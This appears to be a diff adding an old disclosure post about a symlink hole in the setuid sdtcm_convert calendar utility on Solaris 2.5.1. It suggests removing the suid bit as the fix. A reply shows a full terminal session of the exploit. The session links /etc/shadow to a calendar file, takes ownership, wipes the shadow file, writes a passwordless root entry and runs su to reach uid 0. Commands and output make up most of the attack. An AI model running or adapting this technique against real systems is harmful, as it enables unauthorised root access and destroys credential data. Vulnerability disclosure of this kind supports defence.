@@ -1,0 +1,60 @@
+
+
+Another hole in Solaris
+
+I have found a security hole in sdtcm_convert on Solaris 2.5.1.
+sdtcm_convert - calendar data conversion utility - allows any user to
+change the owner for any file (or directory) from the system or gain root
+access. The exploit is very simple. Change the permision mode of your calendar
+file (callog.YOU) from /var/spool/calendar directory (usual r--rw----) and run
+sdtcm_convert. sdtcm_convert 'll observe the change and 'll want  to
+correct it (it 'll ask you first). You have only to delete the callog file
+and make a symbolic link to a target file and your calendar file and said to
+sdtcm_convert 'y' (yes). sdtcm_convert 'll make you the owner of target
+file ...
+A simple way to correct this is to get out suid_exec bit from
+sdtcm_convert.
+
+
+
+-----------------------------------------------------------------------------
+
+
+ CDE is generally a can of worms.
+
+ 22:15  [wumpus:~] % whoami
+ adam
+ 22:15  [wumpus:~] % ls -l /etc/shadow
+ -r--------   1 root     sys          291 Jul 11 22:14 /etc/shadow
+ 22:15  [wumpus:~] % ln -s /etc/shadow /tmp/calorig.adam
+ 22:15  [wumpus:~] % /usr/dt/bin/sdtcm_convert -d /tmp -v 3 adam
+ Loading the calendar ...
+
+ WARNING!! Data will be lost when converting version 4 data format
+ back to version 3 data format.
+
+ Do you want to continue? (Y/N) [Y] y
+
+ Doing conversion ...
+ Writing out new file ...
+ Conversion done successfully.
+ Total number of appointments                    = 0
+ Number of one-time appointments converted       = 0
+ Number of repeating appointments converted      = 0
+ Number of one-time appointments pruned          = 0
+ Number of repeating appointments pruned         = 0
+ The original file is saved in /tmp/calorig.adam
+ 22:15  [wumpus:~] % ls -l /etc/shadow
+ -r--rw----   1 adam     daemon      3114 Jul 11 22:15 /etc/shadow
+ 22:15  [wumpus:~] % chmod 644 /etc/shadow
+ 22:15  [wumpus:~] % cp /dev/null /etc/shadow
+ cp: overwrite /etc/shadow (y/n)? y
+ 22:15  [wumpus:~] % ls -l /etc/shadow
+ -rw-r--r--   1 adam     daemon         0 Jul 11 22:15 /etc/shadow
+ 22:15  [wumpus:~] % echo "root::6445::::::" >> /etc/shadow
+ 22:16  [wumpus:~] % su
+ # id
+ uid=0(root) gid=1(other)
+ # exit
+
+
